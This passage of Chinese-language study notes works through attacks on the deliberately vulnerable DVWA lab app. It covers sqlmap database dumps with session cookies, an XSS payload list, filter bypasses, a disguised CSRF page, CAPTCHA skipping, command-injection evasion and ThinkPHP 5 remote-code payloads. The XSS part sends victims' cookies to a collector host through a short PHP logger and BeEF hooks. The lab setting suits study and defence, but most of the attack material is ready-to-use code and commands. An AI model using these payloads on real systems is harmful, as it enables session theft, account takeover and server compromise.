|\n| simba    | password     |\n| dreveil  | password     |\n| scotty   | password     |\n| cal      | password     |\n| john     | password     |\n| kevin    | 42           |\n| dave     | set          |\n| patches  | tortoise     |\n| rocky    | stripes      |\n| tim      | lanmaster53  |\n| ABaker   | SoSecret     |\n| PPan     | NotTelling   |\n| CHook    | JollyRoger   |\n| james    | i<3devs      |\n| user     | user         |\n| ed       | pentest      |\n+----------+--------------+\n```\n\n如果SQL注入点没有经过登录就可找到，可以直接按照上述方法注入；如果需要登录，肯定不能通过提交方式去登录，因为你也不知道账号密码，所以要通过找cookie（cookie是前端，session是后端）去登录。这也是**SQL注入[中、高]，SQL盲注[中、高]**的解决办法。\n\n回到DVWA（需要登录）的SQL注入，随便输入一个错误数字，用火狐插件cookie监视器将这个网址的所有cookie复制下来（复制下来的是冒号，要改成等号），或者可以通过burpsuite抓包拿到cookie，再跑，结果成功渗透。\n\n```mysql\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" -p id\n\n[16:25:54] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 10.04 (Lucid Lynx)\nweb application technology: PHP 5.3.2, Apache 2.2.14\nback-end DBMS: MySQL >= 5.0\n[16:25:54] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.137.146'   \n\n//先找数据库\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" --dbs\n\navailable databases [2]:\n[*] dvwa\n[*] information_schema\n\n//再找表\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" -D dvwa --tables\n\nDatabase: dvwa\n[2 tables]\n+-----------+\n| guestbook |\n| users     |\n+-----------+\n\n//再找列\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" -D dvwa -T users --columns\n\nDatabase: dvwa\nTable: users\n[6 columns]\n+------------+-------------+\n| Column     | Type        |\n+------------+-------------+\n| user       | varchar(15) |\n| avatar     | varchar(70) |\n| first_name | varchar(15) |\n| last_name  | varchar(15) |\n| password   | varchar(32) |\n| user_id    | int(6)      |\n+------------+-------------+\n\n//再找表中数据\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" -D dvwa -T users -C user,password --dump\n\nDatabase: dvwa                                                    \nTable: users\n[6 entries]\n+---------+---------------------------------------------+\n| user    | password                                    |\n+---------+---------------------------------------------+\n| admin   | 21232f297a57a5a743894a0e4a801fc3 (admin)    |\n| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |\n| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |\n| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |\n| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |\n| user    | ee11cbb19052e40b07aac0ca060c23ee (user)     |\n+---------+---------------------------------------------+\n```\n\n提权操作，与数据库交互：\n\n```mysql\nsqlmap -u \"http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&Submit=Submit#\" --batch --cookie=\"PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada\" --sql-shell\n\nsql-shell> select user,password from users;\n[16:44:30] [INFO] fetching SQL SELECT statement query output: 'select user,password from users'                                       \n[16:44:30] [CRITICAL] connection dropped or unknown HTTP status code received. Try to force the HTTP User-Agent header with option '--user-agent' or switch '--random-agent'. sqlmap is going to retry the request(s)\nselect user,password from users [6]:\n[*] admin, 21232f297a57a5a743894a0e4a801fc3\n[*] gordonb, e99a18c428cb38d5f260853678922e03\n[*] 1337, 8d3533d75ae2c3966d7e0d4fcc69216b\n[*] pablo, 0d107d09f5bbe40cade3de5c71e9e9b7\n[*] smithy, 5f4dcc3b5aa765d61d8327deb882cf99\n[*] user, ee11cbb19052e40b07aac0ca060c23ee\n```\n\n# 4. XSS\n\nCross Site Scripting\n\n经常遭受跨站脚本攻击的典型应用有：邮件、论坛、即时通信、留言板、社交平台等。\n\n## 4.1 XSS跨站脚本攻击\n\nXSS是对客户端进行攻击。\n\n**常用的HTML标签**\n\n```html\n<iframe>\tiframe元素会创建包含另外一个文档的内联框架\n<textarea>\t<textarea>标签定义多行的文本输入控件\n<image>\t\timg元素向网页中嵌入一张图片\n<script>\t<script>标签用于定义客户端脚本，如JavaScript\n    \t\tscript元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件\n            必需的type属性规定脚本的MIME类型\n            JavaScript的常见应用是图像操作，表单验证以及动态内容更新\n```\n\n**常用JavaScript方法**\n\n```html\nalert\t\t\talert()方法用于显示带有一条指定信息和一个确认按钮的警告框\nwindow.location\twindow.location对象用于获得当前页面的地址，并把浏览器重定向到新的页面\nlocation.href\t返回当前显示的文档的完整URL\nonload \t\t\t一张页面或一张图片完成加载\nonsubmit\t\t确认按钮被点击\nonerror\t\t\t在加载文档或图片时发生错误\n```\n\n**构造XSS脚本**\n\n```html\n弹框警告\n此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号'，一旦此脚本能执行，也就意味着后端服务器没有对特殊字符(<>/')做过滤，这样就可以证明这个页面位置存在XSS漏洞。\n<script>alert(\"XSS\")</script>\n<script>alert(document.cookie)</script>\t\t<!-弹出cookie->\n\n页面嵌套\n<iframe src=\"http://www.baidu.com\" width=300 height=300></iframe>\n<iframe src=\"http://www.baidu.com\" width=0 height=0 border=0></iframe> <!-看不见的页面嵌套->\n\n页面重定向\n<script>window.location=\"http://www.baidu.com\"</script>\n<script>location.href=\"http://www.baidu.com\"</script>\n\n弹框警告并重定向\n<script>alert(\"请移步到我们的新站\");location.href=\"http://www.baidu.com\"</script>\n<script>alert('XSS');location.href=\"http://192.168.137.146/dvwa/robots.txt\"</script>\n这里结合了一些社工的思路，例如通过网站内部私信的方式将其发给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户(克隆网站收集账户)\n\n恶意访问代码\n<script src=\"http://www.baidu.com/xss.js\"></script>\n<script src=\"http://BeEF_IP:3000/hook.js\"></script>\t<!-结合BeEF收集用户的cookie->\n\n巧用图片标签\n<img src=\"#\" onerror=alert('xss')>\n<img src=\"javascript:alert('xss');\">\n<img src=\"http://BeEF_IP:3000/hook.js\">\n\n绕开过滤脚本\n大小写<ScrIpt>alert('XSS')</SCRipt>\n字符编码 采用URL，Base64等编码\n<a href=\"&#74;&#97;&#118;&#97;&#83;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#59;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">hacker</a>\t<!-unicode编码->\n\n收集用户cookie\n打开新窗口并且采用本地cookie访问目标网页\n<script>window.open(\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie)</script>\t//弹窗\n<script>document.location=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie</script>\t//跳转空白页面不弹窗\n<script>new Image().src=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie;</script>\t//不会发觉\n<img src=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie>\t//不能用\n<iframe src=\"'http://192.168.137.144/cookie_rec.php?cookie='+document.cookie\"></iframe>\t//不能用\n<script>new Image().src=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie;img.width=0;img.height=0;</script>\t//不会发觉\n```\n\n**输出在HTML属性中**\n\n```html\n原型:\n<input type=\"text\" name=\"user\" value=\"\">\n构造payload:\n\" onlick=alert(/xss/)\n\"><script>alert(/xss/)</script>\n```\n\n**输出在CSS代码中**\n\n```html\n原型:\n<style type=\"text/css\">body{color:{\"\"};}</style>\n构造payload:\nblack; background-image:url('javascript:alert(/xss/)')\n```\n\n**输出在JavaScript代码中**\n\n```html\n原型:\n<script> var name = '';</script>\n构造payload:\n'+alert(/xss/)+'\n```\n\n**XSS反射型**\n\n执行弹框：\n\n```html\n<script>alert(\"xss\")</script>\n```\n\n```http\n//原链接\nhttp://192.168.137.146/dvwa/vulnerabilities/xss_r/\n//新链接\nhttp://192.168.137.146/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E#\n```\n\n如果别人登进dvwa后，点进新链接，也会执行弹框。可以执行弹框，那也可以让别人点进链接后将他的cookie发到另一台服务器上。\n\n**XSS存储型(危害较大)**\n\n```\nkali-BeEF\n```\n\n这是一个留言板，留言板的内容会停留在网页上，如果将恶意代码放在网页上，每个人一访问这个留言板就会中招。\n\n执行弹框：\n\n```html\nname:hello\nmessage:<script>alert(\"xss\")</script>\n```\n\n```http\n//原链接：\nhttp://192.168.137.146/dvwa/vulnerabilities/xss_s/\n//新链接\nhttp://192.168.137.146/dvwa/vulnerabilities/xss_s/\n```\n\n在链接上不会显示什么，但只要一点XSS stored，就会执行弹框。这样称为挂马，把木马挂在了网页上。\n\n访问另一台机器的文件：\n\n```html\n<script src=\"192.168.137.144:3000/hook.js\"></script>\n```\n\n## 4.2 XSS反射型[低]\n\n查看源码：\n\n```php\n<?php\n\nif(!array_key_exists (\"name\", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){\n\n $isempty = true;\n\n} else {\n        \n echo '<pre>';\n echo 'Hello ' . $_GET['name'];\n echo '</pre>';\n    \n}\n\n?>\n```\n\n没有做任何过滤。可以利用以上的xss脚本进行操作。\n\n## 4.3 XSS反射型[中]\n\n查看源码：\n\n```php\n<?php\n\nif(!array_key_exists (\"name\", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){\n\n $isempty = true;\n\n} else {\n\n echo '<pre>';\n echo 'Hello ' . str_replace('<script>', '', $_GET['name']);\n echo '</pre>'; \n\n}\n\n?> \n```\n\nstr.replace()会做一个字符串替换，将\\<script\\>替换成空。所以可以对\\<script\\>进行重写，或者大小写混合。\n\n```html\n<scr<script>ipt>alert(\"xss\")</script>\n<ScrIpt>alert('XSS')</SCRipt>\n```\n\n## 4.4 XSS反射型[高]\n\n查看源码：\n\n```php\n<?php\n    \nif(!array_key_exists (\"name\", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){\n    \n $isempty = true;\n        \n} else {\n    \n echo '<pre>';\n echo 'Hello ' . htmlspecialchars($_GET['name']);\n echo '</pre>';\n        \n}\n\n?> \n```\n\n htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 \n\n## 4.5 XSS存储型[低]\n\n```\n获取cookie，kali作为服务器与攻击机:\n构建收集cookie服务器\n构造XSS代码植入到web服务器\n等待肉鸡触发XSS代码并将cookie发送到服务器\ncookie的利用\n```\n\n构建收集cookie服务器：\n\n```php\nvim /var/www/html/cookie_rec.php\n<?php\n\t$cookie = $_GET['cookie'];\n\t$log = fopen(\"cookie.txt\",\"a\");\n\tfwrite($log, $cookie.\"\\n\\n\");\n\tfclose($log);\n?>\n```\n\n给以下目录权限，等下生成的文本文件存进去：\n\n```\nchown -R www-data.www-data /var/www/\n```\n\n通过渗透机植入XSS代码：\n\n```html\n<script>window.open('http://192.168.137.144/cookie_rec.php?cookie='+document.cookie)</script>\n\n注：要先清除之前植入的XSS代码\n```\n\n在XSS存储型网页中，发现前端限制留言长度，直接在前端修改最大长度即可。当用户点进XSS存储型时，会显示弹窗，用户的cookie信息就会收集在服务器上。但现在很多浏览器都会拦截弹窗，所以弄一个不会弹窗的：\n\n```html\n<script>new Image().src=\"http://192.168.137.144/cookie_rec.php?cookie=\"+document.cookie;</script>\n\n用户几乎不会发觉cookie被盗\n```\n\n## 4.6 XSS存储型[中]\n\n查看源码：\n\n```php\n<?php\n\nif(isset($_POST['btnSign']))\n{\n\n   $message = trim($_POST['mtxMessage']);\n   $name    = trim($_POST['txtName']);\n   \n   // Sanitize message input\n   $message = trim(strip_tags(addslashes($message)));\n   $message = mysql_real_escape_string($message);\n   $message = htmlspecialchars($message);\n    \n   // Sanitize name input\n   $name = str_replace('<script>', '', $name);\n   $name = mysql_real_escape_string($name);\n  \n   $query = \"INSERT INTO guestbook (comment,name) VALUES ('$message','$name');\";\n   \n   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );\n   \n}\n\n?> \n```\n\n可知message用了 htmlspecialchars() 函数，暂时不知道怎么利用，但name没有用，所以可以将恶意代码写进name里面。\n\n## 4.7 XSS存储型[高]\n\n查看源码：\n\n```php\n<?php\n\nif(isset($_POST['btnSign']))\n{\n\n   $message = trim($_POST['mtxMessage']);\n   $name    = trim($_POST['txtName']);\n   \n   // Sanitize message input\n   $message = stripslashes($message);\n   $message = mysql_real_escape_string($message);\n   $message = htmlspecialchars($message);\n   \n   // Sanitize name input\n   $name = stripslashes($name);\n   $name = mysql_real_escape_string($name); \n   $name = htmlspecialchars($name);\n  \n   $query = \"INSERT INTO guestbook (comment,name) VALUES ('$message','$name');\";\n   \n   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );\n   \n}\n\n?> \n```\n\nname和message都用htmlspecialchars()规定了，所以不能在这攻击了。\n\n## 4.8 自动化XSS\n\n**BeEF**\n\n启动Apache和BeEF：\n\n```\nservice apache2 start\ncd /usr/share/beef-xss\n./beef\n```\n\n启动BeEF会自动生成代码和服务器。账号密码保存在/etc/beef-xss/config.yaml\n\n```html\nservice apache2 start\ncd /usr/share/beef-xss\n./beef\n//脚本利用\n<script src=\"http://192.168.193.128:3000/hook.js\"></script>\n//BeEF网站\nhttp://192.168.193.128:3000/ui/panel\n//监听端口\nss -tnlp\n```\n\n用户点进XSS存储型后几乎不会发觉木马，BeEF除了能拿到用户的cookie还能实行很多功能。\n\n```\n命令颜色\n绿色 对目标主机生效并且不可见(不会被发现)\n灰色 对目标主机未必生效(可验证一下)\n橙色 对目标主机生效但可能可见(可能被发现)\n红色 对目标主机不生效\n```\n\n# 5. CSRF(跨站请求伪造)\n\nCSRF是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。\n\nCSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 \n\n## 5.1 CSRF[低]\n\n 查看源码：\n\n```php\n <?php\n                \n    if (isset($_GET['Change'])) {\n    \n        // Turn requests into variables\n        $pass_new = $_GET['password_new'];\n        $pass_conf = $_GET['password_conf'];\n\n\n        if (($pass_new == $pass_conf)){\n            $pass_new = mysql_real_escape_string($pass_new);\n            $pass_new = md5($pass_new);\n\n            $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';\";\n            $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n                        \n            echo \"<pre> Password Changed </pre>\";        \n            mysql_close();\n        }\n    \n        else{        \n            echo \"<pre> Passwords did not match. </pre>\";            \n        }\n\n    }\n?> \n```\n\n这个修改密码竟然是$_GET请求，说明密码会在url上显示。如果用户点击以下链接，他的密码就会改成123。\n\n```\nhttp://192.168.137.146/dvwa/vulnerabilities/csrf/?password_new=abc&password_conf=abc&Change=Change#\n```\n\n可以用短链接的方法隐藏真实的URL，这样就不容易从链接上看出来修改了密码。\n\n也可以制造一个攻击页面。在本机做一个页面getf.html处理\n\nGetf.html页面代码：\n\n```html\n<img src=\"http://192.168.137.146/dvwa/vulnerabilities/csrf/?password_new=abc&password_conf=abc&Change=Change#\" border=0 style=\"display:none;\">\n<h1>404</h1>\n<h2>not found</h2>\n```\n\n把上面链接放在公网某个地址，当用户点击这个链接后，客户可能以为访问了一个失效页面，这样就神不知鬼不觉地修改了用户密码。\n\n## 5.2 CSRF[中]\n\n```php\n <?php\n            \n    if (isset($_GET['Change'])) {\n    \n        // Checks the http referer header\n        if ( eregi ( \"127.0.0.1\", $_SERVER['HTTP_REFERER'] ) ){\n    \n            // Turn requests into variables\n            $pass_new = $_GET['password_new'];\n            $pass_conf = $_GET['password_conf'];\n\n            if ($pass_new == $pass_conf){\n                $pass_new = mysql_real_escape_string($pass_new);\n                $pass_new = md5($pass_new);\n\n                $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';\";\n                $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n                        \n                echo \"<pre> Password Changed </pre>\";        \n                mysql_close();\n            }\n    \n            else{        \n                echo \"<pre> Passwords did not match. </pre>\";            \n            }    \n\n        }\n        \n    }\n?> \n```\n\neregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。源码意思是验证HTTP_REFERER是否是127.0.0.1，判断请求的来源是否是本机，可以通过Burp Suite抓包，然后修改Reffer的值，只要包含127.0.0.1就可以实现修改，甚至可以只是127.0.0.1这个值。\n\n## 5.3 CSRF[高]\n\n```php\n <?php\n            \n    if (isset($_GET['Change'])) {\n    \n        // Turn requests into variables\n        $pass_curr = $_GET['password_current'];\n        $pass_new = $_GET['password_new'];\n        $pass_conf = $_GET['password_conf'];\n\n        // Sanitise current password input\n        $pass_curr = stripslashes( $pass_curr );\n        $pass_curr = mysql_real_escape_string( $pass_curr );\n        $pass_curr = md5( $pass_curr );\n        \n        // Check that the current password is correct\n        $qry = \"SELECT password FROM `users` WHERE user='admin' AND password='$pass_curr';\";\n        $result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );\n\n        if (($pass_new == $pass_conf) && ( $result && mysql_num_rows( $result ) == 1 )){\n            $pass_new = mysql_real_escape_string($pass_new);\n            $pass_new = md5($pass_new);\n\n            $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';\";\n            $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n                        \n            echo \"<pre> Password Changed </pre>\";        \n            mysql_close();\n        }\n    \n        else{        \n            echo \"<pre> Passwords did not match or current password incorrect. </pre>\";            \n        }\n\n    }\n?> \n```\n\n这个在修改密码前要输入原密码，如果不知道原密码，就不能搞了。\n\n# 6. CAPTCHA\n\n## 6.1 不安全验证码[低]\n\nCAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。 简单来说是验证码的意思。\n\n```\nreCAPTCHA API key NULL in config file.\n\nPlease register for a key from reCAPTCHA at [https://www.google.com/recaptcha/admin/create](http://hiderefer.com/?https://www.google.com/recaptcha/admin/create) and set the key in the file /owaspbwa/dvwa-svn/config/config.inc.php    \n```\n\n进入这个页面要很长时间，我猜是因为它去访问谷歌拿验证码了。它说要去 [https://www.google.com/recaptcha/admin/create](http://hiderefer.com/?https://www.google.com/recaptcha/admin/create) 注册密钥再把它放进服务器目录 /owaspbwa/dvwa-svn/config/config.inc.php 里。由于没有科学上网，我就不弄了。\n\n先来看下源码：\n\n```php\n<?php\n\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {\n    \n    $hide_form = true;\n    $user = $_POST['username'];\n    $pass_new = $_POST['password_new'];\n    $pass_conf = $_POST['password_conf'];\n    $resp = recaptcha_check_answer ($_DVWA['recaptcha_private_key'],\n        $_SERVER[\"REMOTE_ADDR\"],\n        $_POST[\"recaptcha_challenge_field\"],\n        $_POST[\"recaptcha_response_field\"]);\n\n    if (!$resp->is_valid) {\n        // What happens when the CAPTCHA was entered incorrectly\n        echo \"<pre><br />The CAPTCHA was incorrect. Please try again.</pre>\";\n        $hide_form = false;\n        return;    \n    } else {\n            if (($pass_new == $pass_conf)){\n            echo \"<pre><br />You passed the CAPTCHA! Click the button to confirm your changes. <br /></pre>\";\n            echo \"\n            <form action=\\\"#\\\" method=\\\"POST\\\">\n                <input type=\\\"hidden\\\" name=\\\"step\\\" value=\\\"2\\\" />\n                <input type=\\\"hidden\\\" name=\\\"password_new\\\" value=\\\"\" . $pass_new . \"\\\" />\n                <input type=\\\"hidden\\\" name=\\\"password_conf\\\" value=\\\"\" . $pass_conf . \"\\\" />\n                <input type=\\\"submit\\\" name=\\\"Change\\\" value=\\\"Change\\\" />\n            </form>\";\n            }    \n\n            else{\n                    echo \"<pre> Both passwords must match </pre>\";\n            $hide_form = false;\n            }\n    }\n}\n\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '2' ) ) \n{\n    $hide_form = true;\n        if ($pass_new != $pass_conf)\n        {\n                echo \"<pre><br />Both passwords must match</pre>\";\n        $hide_form = false;\n                return;\n        }\n        $pass = md5($pass_new);\n        if (($pass_new == $pass_conf)){\n               $pass_new = mysql_real_escape_string($pass_new);\n               $pass_new = md5($pass_new);\n\n               $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n               $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n\n               echo \"<pre> Password Changed </pre>\";\n               mysql_close();\n        }\n\n        else{\n               echo \"<pre> Passwords did not match. </pre>\";\n        }\n}\n\n?> \n```\n\n很清楚看到，整个修改密码过程分为两步，第一步是验证验证码是否正确，第二步是修改密码。我们可以通过抓包直接将step修改为2跳过验证。\n\n## 6.2 不安全验证码[中]\n\n```php\n<?php\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {\n    \n    $hide_form = true;\n    $user = $_POST['username'];\n    $pass_new = $_POST['password_new'];\n    $pass_conf = $_POST['password_conf'];\n    $resp = recaptcha_check_answer($_DVWA['recaptcha_private_key'],\n        $_SERVER[\"REMOTE_ADDR\"],\n        $_POST[\"recaptcha_challenge_field\"],\n        $_POST[\"recaptcha_response_field\"]);\n\n    if (!$resp->is_valid) {\n        // What happens when the CAPTCHA was entered incorrectly\n        echo \"<pre><br />The CAPTCHA was incorrect. Please try again.</pre>\";\n        $hide_form = false;\n        return;    \n    } else {\n            if (($pass_new == $pass_conf)){\n            echo \"<pre><br />You passed the CAPTCHA! Click the button to confirm your changes. <br /></pre>\";\n            echo \"\n            <form action=\\\"#\\\" method=\\\"POST\\\">\n                <input type=\\\"hidden\\\" name=\\\"step\\\" value=\\\"2\\\" />\n                <input type=\\\"hidden\\\" name=\\\"password_new\\\" value=\\\"\" . $pass_new . \"\\\" />\n                <input type=\\\"hidden\\\" name=\\\"password_conf\\\" value=\\\"\" . $pass_conf . \"\\\" />\n                <input type=\\\"hidden\\\" name=\\\"passed_captcha\\\" value=\\\"true\\\" />\n                <input type=\\\"submit\\\" name=\\\"Change\\\" value=\\\"Change\\\" />\n            </form>\";\n            }    \n\n            else{\n                    echo \"<pre> Both passwords must match </pre>\";\n            $hide_form = false;\n            }\n    }\n}\n\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '2' ) ) \n{\n    $hide_form = true;\n    if (!$_POST['passed_captcha'])\n    {\n                echo \"<pre><br />You have not passed the CAPTCHA. Bad hacker, no doughnut.</pre>\";\n        $hide_form = false;\n        return;\n    }\n        $pass = md5($pass_new);\n        if (($pass_new == $pass_conf)){\n               $pass_new = mysql_real_escape_string($pass_new);\n               $pass_new = md5($pass_new);\n\n               $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n               $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n\n               echo \"<pre> Password Changed </pre>\";\n               mysql_close();\n        }\n\n        else{\n               echo \"<pre> Passwords did not match. </pre>\";\n        }\n}\n?> \n```\n\n在第二步可以看到多了一个if语句用来验证验证码，要求 $_POST['passed_captcha']为真。只要在修改包的时候多添加一个参数passed_captcha=true即可。\n\n## 6.3 不安全验证码[高]\n\n```php\n <?php\nif( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {\n    \n    $hide_form = true;\n    \n        $pass_new = $_POST['password_new'];\n    $pass_new = stripslashes( $pass_new );\n    $pass_new = mysql_real_escape_string( $pass_new );\n    $pass_new = md5( $pass_new );\n\n        $pass_conf = $_POST['password_conf'];\n        $pass_conf = stripslashes( $pass_conf );\n    $pass_conf = mysql_real_escape_string( $pass_conf );\n    $pass_conf = md5( $pass_conf );\n    \n        $resp = recaptcha_check_answer ($_DVWA['recaptcha_private_key'],\n        $_SERVER[\"REMOTE_ADDR\"],\n        $_POST[\"recaptcha_challenge_field\"],\n        $_POST[\"recaptcha_response_field\"]);\n\n    if (!$resp->is_valid) {\n        // What happens when the CAPTCHA was entered incorrectly\n        echo \"<pre><br />The CAPTCHA was incorrect. Please try again.</pre>\";\n        $hide_form = false;\n        return;    \n    } else {\n                // Check that the current password is correct\n        $qry = \"SELECT password FROM `users` WHERE user='admin' AND password='$pass_curr';\";\n        $result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );\n                \n                if (($pass_new == $pass_conf)  && ( $result && mysql_num_rows( $result ) == 1 )){\n                       $insert=\"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n                       $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );\n\n                       echo \"<pre> Password Changed </pre>\";\n                       mysql_close();\n                }\n\n                else{\n                       echo \"<pre> Either your current password is incorrect or the new passwords did not match. Please try again. </pre>\";\n                }\n    }\n}\n?> \n```\n\n这种加上原密码再加上验证基本很难攻击。\n\n# 7. 命令执行漏洞\n\n```\nwindows或linux下：\ncommand1 && command2\t先执行1再执行2\ncommand1 || command2\t先执行1，1为假再执行2\ncommand1 & command2\t\t先执行2再执行1\ncommand1 | command2\t\t只执行2\n```\n\n在过滤情况下的解决办法：\n\n| 过滤关键字  | 解决方法                                  | 备注                                                         |\n| ----------- | ----------------------------------------- | ------------------------------------------------------------ |\n| cat         | ca\\t、ca''t、a=c;b=at;\\$a$b xxx、less xxx |                                                              |\n| 空格        | \\$IFS\\$9、<、<>、%20(space)、%09(tab)     | \\$IFS是bash中的内部域分隔符，可以代替空格。后面的$9数字是可以随意的，每个数字都有特殊含义，但是和前面的搭配都可以表示空格。 |\n| 目录分隔符/ | cd flag文件所在目录后在cat flag文件       | ls后用反斜杠\\查看目录里的文件，比如：ls \\flag_is_here        |\n| &、\\|       | 用；来分隔命令                            |                                                              |\n| ；          | %0a                                       |                                                              |\n| flag        | fla*                                      | 不用知道flag的具体名字                                       |\n\n## 7.1 ThinkPHP 5漏洞\n\npayload\n\n```\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag\n```\n\n## 7.2 命令执行漏洞[低]\n\n查看源码：\n\n```php\n<?php\n\nif( isset( $_POST[ 'submit' ] ) ) {\n\n    $target = $_REQUEST[ 'ip' ];\n\n    // Determine OS and execute the ping command.\n    if (stristr(php_uname('s'), 'Windows NT')) { \n    \n        $cmd = shell_exec( 'ping  ' . $target );\n        echo '<pre>'.$cmd.'</pre>';\n        \n    } else { \n    \n        $cmd = shell_exec( 'ping  -c 3 ' . $target );\n        echo '<pre>'.$cmd.'</pre>';\n        \n    }\n    \n}\n?> \n```\n\n这段代码相当于cmd的ping功能：\n\n```\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.008 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.019 ms\n\n--- 127.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2011ms\nrtt min/avg/max/mdev = 0.008/0.016/0.022/0.006 ms\n```\n\n但如果利用合并命令，可以执行ping以外的其他功能，例如**127.0.0.1&&pwd**：\n\n```\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.008 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.017 ms\n\n--- 127.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2019ms\nrtt min/avg/max/mdev = 0.008/0.014/0.017/0.004 ms\n/owaspbwa/dvwa-git/vulnerabilities/exec\n```\n\npwd 命令用作显示工作目录的路径名称 。\n\n## 7.2 命令执行漏洞[中]\n\n查看源码：\n\n```php\n<?php\n\nif( isset( $_POST[ 'submit'] ) ) {\n\n    $target = $_REQUEST[ 'ip' ];\n\n    // Remove any of the charactars in the array (blacklist).\n    $substitutions = array(\n        '&&' => '',\n        ';' => '',\n    );\n\n    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );\n    \n    // Determine OS and execute the ping command.\n    if (stristr(php_uname('s'), 'Windows NT')) { \n    \n        $cmd = shell_exec( 'ping  ' . $target );\n        echo '<pre>'.$cmd.'</pre>';\n        \n    } else { \n    \n        $cmd = shell_exec( 'ping  -c 3 ' . $target );\n        echo '<pre>'.$cmd.'</pre>';\n        \n    }\n}\n\n?> 